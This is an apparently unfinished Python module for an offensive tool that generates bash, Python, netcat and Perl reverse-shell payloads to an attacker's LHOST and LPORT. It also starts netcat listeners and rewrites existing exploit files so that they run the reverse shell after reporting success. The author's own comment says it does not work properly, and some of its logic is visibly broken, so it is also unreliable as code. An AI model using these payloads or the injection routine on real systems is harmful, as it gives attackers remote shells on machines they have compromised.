#!/usr/bin/env python3
# NOTE: This file is not working properly maybe the reverse shell payloads need to be reviewed updated, maybe the parameters and input from user should be taken first and then spawn a new process that manages the listener and the reverse shell input output 
# right now the shells are very complex and not working as expected, maybe will write simple FIFO pipe shells next 


import subprocess
import threading
import time
import os
import tempfile
import shutil
from pathlib import Path

class PayloadManager:
    def __init__(self):
        self.active_listeners = {}
        self.payload_templates = {
            'bash': 'bash -i >& /dev/tcp/{lhost}/{lport} 0>&1',
            'python': 'python3 -c \'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{lhost}",{lport}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);\'',
            'nc': 'nc {lhost} {lport} -e /bin/sh',
            'perl': 'perl -e \'use Socket;$i="{lhost}";$p={lport};socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){{open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");}};\'',
        }
    
    def get_user_configuration(self):
        """Interactive configuration for LHOST/LPORT/payload type"""
        print("\n" + "="*60)
        print(" RCE PAYLOAD CONFIGURATION")
        print("="*60)
        
        # Get LHOST
        while True:
            lhost = input("Enter your attack machine IP (LHOST): ").strip()
            if lhost and self._validate_ip(lhost):
                break
            print(" Invalid IP address. Please try again.")
        
        # Get LPORT
        while True:
            try:
                lport = int(input("Enter listener port (LPORT) [4444]: ").strip() or "4444")
                if 1 <= lport <= 65535:
                    break
                print(" Port must be between 1 and 65535.")
            except ValueError:
                print(" Invalid port number. Please enter a number.")
        
        # get payload type
        print("\nAvailable payload types:")
        for i, (name, template) in enumerate(self.payload_templates.items(), 1):
            print(f"  {i}. {name}")
        
        while True:
            try:
                choice = int(input(f"Select payload type [1-{len(self.payload_templates)}]: ").strip() or "1")
                if 1 <= choice <= len(self.payload_templates):
                    payload_type = list(self.payload_templates.keys())[choice - 1]
                    break
                print(f" Choice must be between 1 and {len(self.payload_templates)}.")
            except ValueError:
                print(" Invalid choice. Please enter a number.")
        
        return {
            'lhost': lhost,
            'lport': lport,
            'payload_type': payload_type
        }
    
    def _validate_ip(self, ip):
        """Basic IP validation"""
        try:
            parts = ip.split('.')
            return len(parts) == 4 and all(0 <= int(part) <= 255 for part in parts)
        except:
            return False
    
    def generate_payload(self, payload_type, lhost, lport):
        """Generate reverse shell payload"""
        template = self.payload_templates.get(payload_type)
        if not template:
            raise ValueError(f"Unknown payload type: {payload_type}")
        
        return template.format(lhost=lhost, lport=lport)
    
    def start_listener(self, lport, lhost="0.0.0.0"):
        """Start netcat listener in background"""
        if lport in self.active_listeners:
            print(f"  Listener already running on port {lport}")
            return True
        
        try:
            print(f" Starting listener on {lhost}:{lport}...")
            
            # Start netcat listener in background
            cmd = ["nc", "-lvnp", str(lport)]
            process = subprocess.Popen(
                cmd,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                stdin=subprocess.PIPE,
                text=True
            )
            
            self.active_listeners[lport] = {
                'process': process,
                'host': lhost,
                'port': lport,
                'start_time': time.time()
            }
            
            print(f" Listener started successfully on port {lport}")
            print(f" Connect with: nc {lhost} {lport}")
            return True
            
        except Exception as e:
            print(f" Failed to start listener: {e}")
            return False
    
    def check_listener_status(self, lport):
        """Check if listener is still active"""
        if lport not in self.active_listeners:
            return False
        
        process = self.active_listeners[lport]['process']
        return process.poll() is None
    
    def stop_listener(self, lport):
        """Stop listener"""
        if lport in self.active_listeners:
            process = self.active_listeners[lport]['process']
            process.terminate()
            del self.active_listeners[lport]
            print(f" Stopped listener on port {lport}")
    
    def list_active_listeners(self):
        """List all active listeners"""
        if not self.active_listeners:
            print(" No active listeners")
            return
        
        print("\nðŸŽ§ Active Listeners:")
        for lport, info in self.active_listeners.items():
            uptime = int(time.time() - info['start_time'])
            status = " Active" if self.check_listener_status(lport) else "ðŸ”´ Dead"
            print(f"  Port {lport}: {status} (uptime: {uptime}s)")
    
    def modify_exploit_with_payload(self, exploit_path, payload, target, port):
        """Modify exploit to include reverse shell payload"""
        try:
            # Read original exploit
            with open(exploit_path, 'r', encoding='utf-8', errors='ignore') as f:
                content = f.read()
            
            # Create modified version
            modified_content = self._inject_payload_into_exploit(content, payload, target, port)
            
            # Write to temporary file
            temp_dir = tempfile.mkdtemp()
            temp_path = Path(temp_dir) / f"modified_{Path(exploit_path).name}"
            
            with open(temp_path, 'w', encoding='utf-8') as f:
                f.write(modified_content)
            
            # Make executable
            os.chmod(temp_path, 0o755)
            
            return str(temp_path)
            
        except Exception as e:
            print(f" Failed to modify exploit: {e}")
            return None
    
    def _inject_payload_into_exploit(self, content, payload, target, port):
        """Smart payload injection into exploit code"""
        lines = content.split('\n')
        modified_lines = []
        
        # Look for common injection points
        for i, line in enumerate(lines):
            modified_lines.append(line)
            
            # Python exploits - look for successful exploitation indicators
            if any(pattern in line.lower() for pattern in [
                'print("exploit successful")',
                'print("exploitation successful")',
                'print("success")',
                'exploit successful',
                'exploitation complete',
                '# exploitation code ends here'
            ]):
                # Add payload after success message
                modified_lines.append(f'    # Reverse shell payload injection')
                modified_lines.append(f'    import os')
                modified_lines.append(f'    os.system("{payload}")')
            
            # Look for shell command execution points
            elif any(pattern in line for pattern in ['os.system', 'subprocess.call', 'exec(']):
                # Add payload before or after existing command
                if 'os.system' in line and 'payload' not in line.lower():
                    modified_lines.append(f'    os.system("{payload}")  # Reverse shell')
            
            # C exploits - look for successful shellcode execution
            elif any(pattern in line.lower() for pattern in [
                'shellcode executed',
                'exploit successful',
                'system("/bin/sh")',
                'execve("/bin/sh"'
            ]):
                modified_lines.append(f'    system("{payload}");  // Reverse shell')
            
            # C code - look for main function end or return statements
            elif 'return' in line and ('0' in line or 'EXIT_SUCCESS' in line):
                # Insert before return statement
                modified_lines.insert(-1, f'    system("{payload}");  // Reverse shell')
            
            # C code - look for successful exploitation points
            elif any(pattern in line for pattern in ['printf("exploit', 'printf("success', 'puts("exploit']):
                modified_lines.append(f'    system("{payload}");  // Reverse shell')
        
        # If no obvious injection point found, add payload at the end
        if payload not in '\n'.join(modified_lines):
            modified_lines.append('')
            
            # Determine file type and use appropriate syntax
            if content.strip().endswith('.py') or any('.py' in line for line in lines[:5]):
                modified_lines.append('# Reverse shell payload added by PayloadManager')
                modified_lines.append(f'import os; os.system("{payload}")')
            elif content.strip().endswith('.c') or any('#include' in line for line in lines[:10]):
                modified_lines.append('// Reverse shell payload added by PayloadManager')
                modified_lines.append('#include <stdlib.h>')
                modified_lines.append(f'system("{payload}");')
            elif content.strip().endswith('.pl'):
                modified_lines.append('# Reverse shell payload added by PayloadManager')
                modified_lines.append(f'system("{payload}");')
            elif content.strip().endswith('.sh'):
                modified_lines.append('# Reverse shell payload added by PayloadManager')
                modified_lines.append(payload)
            else:
                # Default fallback
                modified_lines.append('// Reverse shell payload added by PayloadManager')
                modified_lines.append(f'system("{payload}");')
        
        return '\n'.join(modified_lines)
    
    def cleanup_temp_files(self):
        """Clean up temporary exploit files"""
        # This will be called when the program exits
        pass

# Global instance
payload_manager = PayloadManager()
